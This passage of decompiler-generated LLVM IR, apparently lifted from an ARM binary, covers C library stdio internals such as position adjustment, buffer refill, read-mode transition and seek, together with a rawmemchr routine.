bb12:                                             ; preds = %bb10
  %v7_160b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_160b4, i32* @r4, align 4
  ret i32 %v1_160ac

bb13:                                             ; preds = %bb10
  %v0_160b8 = load i32, i32* @r4, align 4
  %v1_160b8 = inttoptr i32 %v0_160b8 to i32*
  %v2_160b8 = load i32, i32* %v1_160b8, align 4
  %v1_160bc = or i32 %v2_160b8, 8
  store i32 %v1_160bc, i32* %r1.global-to-local, align 4
  %v1_160c0 = or i32 %v2_160b8, 4
  store i32 %v1_160c0, i32* %r3.global-to-local, align 4
  %v3_160c4 = sdiv i32 %v2_160b8, 256
  store i32 %v3_160c4, i32* @ip, align 4
  br i1 %v2_160b0, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_160cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_160cc, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_160d0 = trunc i32 %v3_160c4 to i8
  %v4_160d0 = add i32 %v0_160b8, 1
  %v5_160d0 = inttoptr i32 %v4_160d0 to i8*
  store i8 %v2_160d0, i8* %v5_160d0, align 1
  %v0_160d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_160d4.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_160d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_160d4 = trunc i32 %v1_160d4 to i8
  %v3_160d4 = load i32, i32* @r4, align 4
  %v4_160d4 = inttoptr i32 %v3_160d4 to i8*
  store i8 %v2_160d4, i8* %v4_160d4, align 1
  %v0_160d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_160d8.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_160d8 = load i32, i32* @ip, align 4
  %v2_160d8 = trunc i32 %v1_160d8 to i8
  %v3_160d8 = load i32, i32* @r4, align 4
  %v4_160d8 = add i32 %v3_160d8, 1
  %v5_160d8 = inttoptr i32 %v4_160d8 to i8*
  store i8 %v2_160d8, i8* %v5_160d8, align 1
  %v0_160dc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_160dc.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_160dc = load i32, i32* %r1.global-to-local, align 4
  %v2_160dc = trunc i32 %v1_160dc to i8
  %v3_160dc = load i32, i32* @r4, align 4
  %v4_160dc = inttoptr i32 %v3_160dc to i8*
  store i8 %v2_160dc, i8* %v4_160dc, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_160e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_160e0, i32* @r4, align 4
  %v11_160e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_160e0

; uselistorder directives
  uselistorder i32 %v3_160c4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_160e4 = load i32, i32* @r4, align 4
  store i32 %v3_160e4, i32* %stack_var_-16, align 4
  %v2_160e8 = add i32 %tmp, 1
  %v3_160e8 = inttoptr i32 %v2_160e8 to i8*
  %v4_160e8 = load i8, i8* %v3_160e8, align 1
  %v5_160e8 = zext i8 %v4_160e8 to i32
  %v3_160ec = load i8, i8* %arg1, align 1
  %v4_160ec = zext i8 %v3_160ec to i32
  store i32 %v4_160ec, i32* %r2.global-to-local, align 4
  %v4_160f0 = mul nuw nsw i32 %v5_160e8, 256
  %v5_160f0 = or i32 %v4_160ec, %v4_160f0
  store i32 %v5_160f0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_160ec, 4
  %v2_160f4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_160f4, label %bb, label %dec_label_pc_16104

bb:                                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_16104:                               ; preds = %entry
  %v1_160f4 = zext i8 %tmp15 to i32
  %v1_16104 = add nsw i32 %v1_160f4, -1
  store i32 %v1_16104, i32* @ip, align 4
  %v7_16104 = icmp eq i8 %tmp15, 1
  br i1 %v7_16104, label %.thread, label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16104
  %v1_1610c = and i32 %v4_160f0, 2048
  %v2_1610c = icmp eq i32 %v1_1610c, 0
  br i1 %v2_1610c, label %.thread, label %dec_label_pc_16114

dec_label_pc_16114:                               ; preds = %dec_label_pc_1610c
  %v8_16118 = icmp sgt i32 %v1_16104, 1
  br i1 %v8_16118, label %dec_label_pc_161a4, label %dec_label_pc_1611c

dec_label_pc_1611c:                               ; preds = %dec_label_pc_16114
  %v2_1611c = add i32 %tmp, 40
  %v3_1611c = inttoptr i32 %v2_1611c to i32*
  %v4_1611c = load i32, i32* %v3_1611c, align 4
  %v2_16120 = icmp eq i32 %v4_1611c, 0
  br i1 %v2_16120, label %dec_label_pc_16128, label %dec_label_pc_161a4

dec_label_pc_16128:                               ; preds = %dec_label_pc_1611c
  %v2_16128 = add i32 %tmp, 3
  %v3_16128 = inttoptr i32 %v2_16128 to i8*
  %v4_16128 = load i8, i8* %v3_16128, align 1
  %v5_16128 = zext i8 %v4_16128 to i32
  %v2_1612c = add i32 %tmp, 44
  %v3_1612c = inttoptr i32 %v2_1612c to i32*
  %v4_1612c = load i32, i32* %v3_1612c, align 4
  store i32 %v4_1612c, i32* %r2.global-to-local, align 4
  %v2_16130 = sub nsw i32 %v1_16104, %v5_16128
  %v1_16138 = add nsw i32 %v2_16130, -1
  store i32 %v1_16138, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_1612c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_16128
  %v7_1613c = add i32 %tmp, 2
  %v8_1613c = inttoptr i32 %v7_1613c to i8*
  %v9_1613c = load i8, i8* %v8_1613c, align 1
  %v10_1613c = zext i8 %v9_1613c to i32
  %v7_16140 = sub nsw i32 %v1_16138, %v10_1613c
  store i32 %v7_16140, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16128, %bb, %dec_label_pc_1610c, %dec_label_pc_16104, %bb12
  %v0_1615c = phi i32 [ %v1_16104, %dec_label_pc_1610c ], [ %v1_16104, %dec_label_pc_16104 ], [ 0, %bb ], [ %v7_16140, %bb12 ], [ %v1_16138, %dec_label_pc_16128 ]
  %v1_16144 = and i32 %v4_160ec, 64
  %v2_16144 = icmp eq i32 %v1_16144, 0
  %storemerge.in.in.v = select i1 %v2_16144, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_16150 = add i32 %tmp, 16
  %v3_16150 = inttoptr i32 %v2_16150 to i32*
  %v4_16150 = load i32, i32* %v3_16150, align 4
  %v2_16154 = sub i32 %storemerge, %v4_16150
  %v1_16158 = inttoptr i32 %arg2 to i32*
  %v2_16158 = load i32, i32* %v1_16158, align 4
  store i32 %v2_16158, i32* %r1.global-to-local, align 4
  %v3_16158 = add i32 %arg2, 4
  %v4_16158 = inttoptr i32 %v3_16158 to i32*
  %v5_16158 = load i32, i32* %v4_16158, align 4
  store i32 %v5_16158, i32* %r2.global-to-local, align 4
  %v2_1615c = add i32 %v2_16154, %v0_1615c
  store i32 %v2_1615c, i32* %r5.global-to-local, align 4
  %v2_16160 = sub i32 %v2_16158, %v2_1615c
  %v2_16164 = and i32 %v2_1615c, 1073741824
  %v3_16164 = icmp ne i32 %v2_16164, 0
  %v6_16164 = icmp eq i1 %v3_16164, false
  %tmp16 = icmp slt i32 %v2_1615c, 0
  %v4_16164.neg = zext i1 %tmp16 to i32
  %v7_16164 = add i32 %v5_16158, %v4_16164.neg
  %v9_16164 = sext i1 %v6_16164 to i32
  %v10_16164 = add i32 %v7_16164, %v9_16164
  store i32 %v10_16164, i32* %r4.global-to-local, align 4
  store i32 %v2_16160, i32* %v1_16158, align 4
  %v5_16168 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16168, i32* %v4_16158, align 4
  %v0_1616c = load i32, i32* %r6.global-to-local, align 4
  %v1_1616c = add i32 %v0_1616c, 4
  %v2_1616c = inttoptr i32 %v1_1616c to i32*
  %v3_1616c = load i32, i32* %v2_1616c, align 4
  %v1_16170 = load i32, i32* %r2.global-to-local, align 4
  %v8_16174 = icmp sgt i32 %v3_1616c, %v1_16170
  br i1 %v8_16174, label %dec_label_pc_16188, label %dec_label_pc_16178

dec_label_pc_16178:                               ; preds = %.thread
  %v9_16170 = icmp eq i32 %v3_1616c, %v1_16170
  br i1 %v9_16170, label %dec_label_pc_1617c, label %dec_label_pc_1618cthread-pre-split

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16178
  %v1_1617c = inttoptr i32 %v0_1616c to i32*
  %v2_1617c = load i32, i32* %v1_1617c, align 4
  %v1_16180 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1617c, %v1_16180
  br i1 %tmp17, label %dec_label_pc_16188, label %dec_label_pc_1618cthread-pre-split

dec_label_pc_16188:                               ; preds = %dec_label_pc_1617c, %.thread
  %v0_16188 = load i32, i32* %r5.global-to-local, align 4
  %v1_16188 = sub i32 0, %v0_16188
  store i32 %v1_16188, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1618c

dec_label_pc_1618cthread-pre-split:               ; preds = %dec_label_pc_1617c, %dec_label_pc_16178
  %v0_1618c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_1618cthread-pre-split, %dec_label_pc_16188
  %v0_1618c = phi i32 [ %v0_1618c.pr, %dec_label_pc_1618cthread-pre-split ], [ %v1_16188, %dec_label_pc_16188 ]
  %v1_1618c = icmp slt i32 %v0_1618c, 0
  br i1 %v1_1618c, label %dec_label_pc_16194, label %dec_label_pc_161a8

dec_label_pc_16194:                               ; preds = %dec_label_pc_1618c
  %v0_16194 = call i32 @__errno_location()
  %v2_1619c = inttoptr i32 %v0_16194 to i32*
  store i32 75, i32* %v2_1619c, align 4
  %v0_161a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a8

dec_label_pc_161a4:                               ; preds = %dec_label_pc_1611c, %dec_label_pc_16114
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_161a8

dec_label_pc_161a8:                               ; preds = %dec_label_pc_1618c, %dec_label_pc_16194, %dec_label_pc_161a4
  %v0_161a8 = phi i32 [ %v0_1618c, %dec_label_pc_1618c ], [ %v0_161a8.pre, %dec_label_pc_16194 ], [ -1, %dec_label_pc_161a4 ]
  %v2_161ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_161ac, i32* @r4, align 4
  ret i32 %v0_161a8

; uselistorder directives
  uselistorder i32 %v1_16170, { 1, 0 }
  uselistorder i32 %v3_1616c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_160ec, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_161a8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_161b0 = load i32, i32* @r4, align 4
  store i32 %v3_161b0, i32* %stack_var_-8, align 4
  %v1_161b4 = add i32 %arg1, 8
  %v1_161b8 = inttoptr i32 %v1_161b4 to i32*
  %v2_161b8 = load i32, i32* %v1_161b8, align 4
  store i32 %v2_161b8, i32* @r1, align 4
  %v3_161b8 = add i32 %arg1, 12
  %v4_161b8 = inttoptr i32 %v3_161b8 to i32*
  %v5_161b8 = load i32, i32* %v4_161b8, align 4
  %v2_161bc = sub i32 %v5_161b8, %v2_161b8
  store i32 %v2_161bc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_161c4 = inttoptr i32 %arg1 to i8*
  %v4_161c4 = call i32 @__stdio_READ(i8* %v3_161c4, i32 %v2_161b8, i32 %v2_161bc)
  %v0_161c8 = load i32, i32* @r4, align 4
  %v1_161c8 = add i32 %v0_161c8, 8
  %v2_161c8 = inttoptr i32 %v1_161c8 to i32*
  %v3_161c8 = load i32, i32* %v2_161c8, align 4
  store i32 %v3_161c8, i32* %r2.global-to-local, align 4
  %v2_161cc = add i32 %v3_161c8, %v4_161c4
  %v2_161d0 = add i32 %v0_161c8, 20
  %v3_161d0 = inttoptr i32 %v2_161d0 to i32*
  store i32 %v2_161cc, i32* %v3_161d0, align 4
  %v0_161d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_161d4 = load i32, i32* @r4, align 4
  %v2_161d4 = add i32 %v1_161d4, 16
  %v3_161d4 = inttoptr i32 %v2_161d4 to i32*
  store i32 %v0_161d4, i32* %v3_161d4, align 4
  %v2_161d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_161d8, i32* @r4, align 4
  ret i32 %v4_161c4

; uselistorder directives
  uselistorder i32 %v4_161c4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_161dc = load i32, i32* @r4, align 4
  store i32 %v3_161dc, i32* %stack_var_-12, align 4
  %v0_161e0 = load i32, i32* @r0, align 4
  %v1_161e0 = inttoptr i32 %v0_161e0 to i8*
  %v2_161e0 = load i8, i8* %v1_161e0, align 1
  %v3_161e0 = zext i8 %v2_161e0 to i32
  store i32 %v3_161e0, i32* %r2.global-to-local, align 4
  %v1_161e4 = add i32 %v0_161e0, 1
  %v2_161e4 = inttoptr i32 %v1_161e4 to i8*
  %v3_161e4 = load i8, i8* %v2_161e4, align 1
  %v4_161e4 = zext i8 %v3_161e4 to i32
  store i32 %v4_161e4, i32* %r3.global-to-local, align 4
  %v4_161e8 = mul nuw nsw i32 %v4_161e4, 256
  %v5_161e8 = or i32 %v4_161e8, %v3_161e0
  store i32 %v5_161e8, i32* %r2.global-to-local, align 4
  %v1_161ec = load i32, i32* @r1, align 4
  %v2_161ec = and i32 %v1_161ec, %v5_161e8
  %v4_161ec = icmp eq i32 %v2_161ec, 0
  store i32 %v0_161e0, i32* @r4, align 4
  br i1 %v4_161ec, label %dec_label_pc_161f8, label %dec_label_pc_16210

dec_label_pc_161f8:                               ; preds = %entry
  %v1_161f8 = and i32 %v5_161e8, 2176
  %v2_161f8 = icmp eq i32 %v1_161f8, 0
  br i1 %v2_161f8, label %dec_label_pc_16200, label %dec_label_pc_16224

dec_label_pc_16200:                               ; preds = %dec_label_pc_161f8
  %v2_16200 = or i32 %v1_161ec, %v5_161e8
  store i32 %v2_16200, i32* %r2.global-to-local, align 4
  %v3_16204 = sdiv i32 %v2_16200, 256
  store i32 %v3_16204, i32* %r3.global-to-local, align 4
  %v1_16208 = trunc i32 %v3_16204 to i8
  store i8 %v1_16208, i8* %v2_161e4, align 1
  %v0_1620c = load i32, i32* %r2.global-to-local, align 4
  %v1_1620c = trunc i32 %v0_1620c to i8
  %v2_1620c = load i32, i32* @r0, align 4
  %v3_1620c = inttoptr i32 %v2_1620c to i8*
  store i8 %v1_1620c, i8* %v3_1620c, align 1
  %v0_16210.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16210

dec_label_pc_16210:                               ; preds = %entry, %dec_label_pc_16200
  %v0_16210 = phi i32 [ %v0_161e0, %entry ], [ %v0_16210.pre, %dec_label_pc_16200 ]
  %v1_16210 = inttoptr i32 %v0_16210 to i8*
  %v2_16210 = load i8, i8* %v1_16210, align 1
  %v3_16210 = zext i8 %v2_16210 to i32
  store i32 %v3_16210, i32* %r2.global-to-local, align 4
  %v1_16214 = add i32 %v0_16210, 1
  %v2_16214 = inttoptr i32 %v1_16214 to i8*
  %v3_16214 = load i8, i8* %v2_16214, align 1
  %v4_16214 = zext i8 %v3_16214 to i32
  %v4_16218 = mul nuw nsw i32 %v4_16214, 256
  %v5_16218 = or i32 %v4_16218, %v3_16210
  store i32 %v5_16218, i32* %r3.global-to-local, align 4
  %v1_1621c = and i32 %v3_16210, 16
  store i32 %v1_1621c, i32* %r5.global-to-local, align 4
  %v2_1621c = icmp eq i32 %v1_1621c, 0
  br i1 %v2_1621c, label %dec_label_pc_1624c, label %dec_label_pc_16224

dec_label_pc_16224:                               ; preds = %dec_label_pc_161f8, %dec_label_pc_16210
  %v0_16224 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1622c = inttoptr i32 %v0_16224 to i32*
  store i32 9, i32* %v2_1622c, align 4
  br label %dec_label_pc_16230

dec_label_pc_16230:                               ; preds = %dec_label_pc_16254, %dec_label_pc_16224
  %v0_16230 = load i32, i32* @r4, align 4
  %v1_16230 = inttoptr i32 %v0_16230 to i32*
  %v2_16230 = load i32, i32* %v1_16230, align 4
  %v1_16234 = or i32 %v2_16230, 8
  store i32 %v1_16234, i32* %r3.global-to-local, align 4
  %v3_16238 = sdiv i32 %v2_16230, 256
  store i32 %v3_16238, i32* %r2.global-to-local, align 4
  %v1_16240 = trunc i32 %v3_16238 to i8
  %v3_16240 = add i32 %v0_16230, 1
  %v4_16240 = inttoptr i32 %v3_16240 to i8*
  store i8 %v1_16240, i8* %v4_16240, align 1
  %v0_16244 = load i32, i32* %r3.global-to-local, align 4
  %v1_16244 = trunc i32 %v0_16244 to i8
  %v2_16244 = load i32, i32* @r4, align 4
  %v3_16244 = inttoptr i32 %v2_16244 to i8*
  store i8 %v1_16244, i8* %v3_16244, align 1
  %v2_16248 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16248, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16210
  %v1_1624c = and i32 %v3_16210, 64
  %v2_1624c = icmp eq i32 %v1_1624c, 0
  br i1 %v2_1624c, label %dec_label_pc_1627c, label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %dec_label_pc_1624c
  %v0_16254 = call i32 @__stdio_wcommit()
  %v2_16258 = icmp eq i32 %v0_16254, 0
  br i1 %v2_16258, label %dec_label_pc_16260, label %dec_label_pc_16230

dec_label_pc_16260:                               ; preds = %dec_label_pc_16254
  %v0_16260 = load i32, i32* @r4, align 4
  %v1_16260 = inttoptr i32 %v0_16260 to i32*
  %v2_16260 = load i32, i32* %v1_16260, align 4
  store i32 %v2_16260, i32* %r3.global-to-local, align 4
  %v1_16264 = add i32 %v0_16260, 8
  %v2_16264 = inttoptr i32 %v1_16264 to i32*
  %v3_16264 = load i32, i32* %v2_16264, align 4
  store i32 %v3_16264, i32* %r2.global-to-local, align 4
  %v1_16268 = and i32 %v2_16260, -65
  store i32 %v1_16268, i32* %r3.global-to-local, align 4
  %v3_1626c = sdiv i32 %v2_16260, 256
  store i32 %v3_1626c, i32* %r1.global-to-local, align 4
  %v2_16270 = add i32 %v0_16260, 28
  %v3_16270 = inttoptr i32 %v2_16270 to i32*
  store i32 %v3_16264, i32* %v3_16270, align 4
  %v0_16274 = load i32, i32* %r1.global-to-local, align 4
  %v1_16274 = trunc i32 %v0_16274 to i8
  %v2_16274 = load i32, i32* @r4, align 4
  %v3_16274 = add i32 %v2_16274, 1
  %v4_16274 = inttoptr i32 %v3_16274 to i8*
  store i8 %v1_16274, i8* %v4_16274, align 1
  %v0_16278 = load i32, i32* %r3.global-to-local, align 4
  %v1_16278 = trunc i32 %v0_16278 to i8
  %v2_16278 = load i32, i32* @r4, align 4
  %v3_16278 = inttoptr i32 %v2_16278 to i8*
  store i8 %v1_16278, i8* %v3_16278, align 1
  %v0_1627c.pre = load i32, i32* @r4, align 4
  %v0_16288.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1627c

dec_label_pc_1627c:                               ; preds = %dec_label_pc_1624c, %dec_label_pc_16260
  %v0_16288 = phi i32 [ 0, %dec_label_pc_1624c ], [ %v0_16288.pre, %dec_label_pc_16260 ]
  %v2_1628c = phi i32 [ %v0_16210, %dec_label_pc_1624c ], [ %v0_1627c.pre, %dec_label_pc_16260 ]
  %v1_1627c = inttoptr i32 %v2_1628c to i32*
  %v2_1627c = load i32, i32* %v1_1627c, align 4
  %v1_16280 = or i32 %v2_1627c, 1
  store i32 %v1_16280, i32* %r3.global-to-local, align 4
  %v3_16284 = sdiv i32 %v2_1627c, 256
  store i32 %v3_16284, i32* %r2.global-to-local, align 4
  %v1_1628c = trunc i32 %v3_16284 to i8
  %v3_1628c = add i32 %v2_1628c, 1
  %v4_1628c = inttoptr i32 %v3_1628c to i8*
  store i8 %v1_1628c, i8* %v4_1628c, align 1
  %v0_16290 = load i32, i32* %r3.global-to-local, align 4
  %v1_16290 = trunc i32 %v0_16290 to i8
  %v2_16290 = load i32, i32* @r4, align 4
  %v3_16290 = inttoptr i32 %v2_16290 to i8*
  store i8 %v1_16290, i8* %v3_16290, align 1
  %v2_16294 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16294, i32* @r4, align 4
  ret i32 %v0_16288

; uselistorder directives
  uselistorder i32 %v3_16284, { 1, 0 }
  uselistorder i32 %v3_16238, { 1, 0 }
  uselistorder i32 %v3_16210, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16210, { 0, 2, 1 }
  uselistorder i32 %v3_16204, { 1, 0 }
  uselistorder i32 %v5_161e8, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1627c, { 1, 0 }
  uselistorder label %dec_label_pc_16224, { 1, 0 }
  uselistorder label %dec_label_pc_16210, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1629c = load i32, i32* @r4, align 4
  %v6_1629c = load i32, i32* @lr, align 4
  %v1_162a0 = add i32 %arg1, 4
  %v2_162a0 = inttoptr i32 %v1_162a0 to i32*
  %v3_162a0 = load i32, i32* %v2_162a0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_162a8 = load i32, i32* %arg2, align 4
  %v3_162a8 = add i32 %tmp, 4
  %v4_162a8 = inttoptr i32 %v3_162a8 to i32*
  %v5_162a8 = load i32, i32* %v4_162a8, align 4
  %v6_162ac = call i32 @__libc_lseek64(i32 %v3_162a0, i32 %v2_162a8, i32 %v5_162a8, i32 %arg3, i32 %v3_1629c, i32 %v6_1629c)
  %v1_162b0 = icmp slt i32 %v2_162a8, 0
  %v6_162ac. = select i1 %v1_162b0, i32 %v6_162ac, i32 0
  store i32 %v6_162ac., i32* %r3.global-to-local, align 4
  br i1 %v1_162b0, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_162bc = load i32, i32* @r4, align 4
  %v4_162bc = inttoptr i32 %v3_162bc to i32*
  store i32 %v6_162ac, i32* %v4_162bc, align 4
  %v6_162bc = add i32 %v3_162bc, 4
  %v7_162bc = inttoptr i32 %v6_162bc to i32*
  store i32 %v2_162a8, i32* %v7_162bc, align 4
  %v0_162c0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_162c0 = phi i32 [ %v6_162ac, %entry ], [ %v0_162c0.pre, %bb ]
  ret i32 %v0_162c0

; uselistorder directives
  uselistorder i32 %v6_162ac, { 0, 2, 1 }
  uselistorder i32 %v2_162a8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_162ec:
  %v1_162cc = urem i32 %arg1, 256
  store i32 %v1_162cc, i32* @lr, align 4
  %v4_162ec = mul nuw nsw i32 %v1_162cc, 256
  %v5_162ec = or i32 %v4_162ec, %v1_162cc
  %v4_162f4 = mul i32 %v5_162ec, 65536
  %v5_162f4 = or i32 %v4_162f4, %v5_162ec
  %v0_162f8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_162f8

dec_label_pc_162f8:                               ; preds = %dec_label_pc_16364, %dec_label_pc_162f8, %dec_label_pc_162ec
  %v0_162f8 = phi i32 [ %v0_162f8.pre, %dec_label_pc_162ec ], [ %v4_162f8, %dec_label_pc_162f8 ], [ %v4_162f8, %dec_label_pc_16364 ]
  %v1_162f8 = inttoptr i32 %v0_162f8 to i32*
  %v2_162f8 = load i32, i32* %v1_162f8, align 4
  %v4_162f8 = add i32 %v0_162f8, 4
  store i32 %v4_162f8, i32* @ip, align 4
  %v2_16300 = xor i32 %v2_162f8, %v5_162f4
  %v2_16304 = add i32 %v2_16300, 2130640639
  %v1_1630c = sub i32 -1, %v2_16300
  %v2_16310 = xor i32 %v2_16304, %v1_1630c
  %v2_16314 = and i32 %v2_16310, -2130640640
  %v2_16318 = icmp eq i32 %v2_16314, 0
  br i1 %v2_16318, label %dec_label_pc_162f8, label %dec_label_pc_16320

dec_label_pc_16320:                               ; preds = %dec_label_pc_162f8
  %v2_16320 = inttoptr i32 %v0_162f8 to i8*
  %v3_16320 = load i8, i8* %v2_16320, align 1
  %v4_16320 = zext i8 %v3_16320 to i32
  %v9_16328 = icmp eq i32 %v4_16320, %v1_162cc
  store i1 %v9_16328, i1* @cpsr_z, align 1
  %v1_1632c = add i32 %v0_162f8, 3
  %v1_16330 = add i32 %v0_162f8, 1
  store i32 %v1_16330, i32* @r2, align 4
  %v1_16334 = add i32 %v0_162f8, 2
  br i1 %v9_16328, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_16320
  ret i32 %v0_162f8

bb18:                                             ; preds = %dec_label_pc_16320
  %v2_1633c = inttoptr i32 %v1_16330 to i8*
  %v3_1633c = load i8, i8* %v2_1633c, align 1
  %v4_1633c = zext i8 %v3_1633c to i32
  %v9_16340 = icmp eq i32 %v4_1633c, %v1_162cc
  store i1 %v9_16340, i1* @cpsr_z, align 1
  br i1 %v9_16340, label %dec_label_pc_16348, label %dec_label_pc_16350

dec_label_pc_16348:                               ; preds = %bb18
  ret i32 %v1_16330

dec_label_pc_16350:                               ; preds = %bb18
  %v2_16350 = inttoptr i32 %v1_16334 to i8*
  %v3_16350 = load i8, i8* %v2_16350, align 1
  %v4_16350 = zext i8 %v3_16350 to i32
  %v9_16354 = icmp eq i32 %v4_16350, %v1_162cc
  store i1 %v9_16354, i1* @cpsr_z, align 1
  br i1 %v9_16354, label %dec_label_pc_1635c, label %dec_label_pc_16364

dec_label_pc_1635c:                               ; preds = %dec_label_pc_16350
  ret i32 %v1_16334

dec_label_pc_16364:                               ; preds = %dec_label_pc_16350
  %v2_16364 = inttoptr i32 %v1_1632c to i8*
  %v3_16364 = load i8, i8* %v2_16364, align 1
  %v4_16364 = zext i8 %v3_16364 to i32
  %v9_16368 = icmp eq i32 %v4_16364, %v1_162cc
  store i1 %v9_16368, i1* @cpsr_z, align 1
  br i1 %v9_16368, label %dec_label_pc_16370, label %dec_label_pc_162f8

dec_label_pc_16370:                               ; preds = %dec_label_pc_16364
  ret i32 %v1_1632c

; uselistorder directives
  uselistorder i32 %v4_162f8, { 2, 1, 0 }
  uselistorder i32 %v0_162f8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_162ec, { 1, 0 }
  uselistorder i32 %v1_162cc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 5, 6, 1, 0, 2, 3, 4 }
}

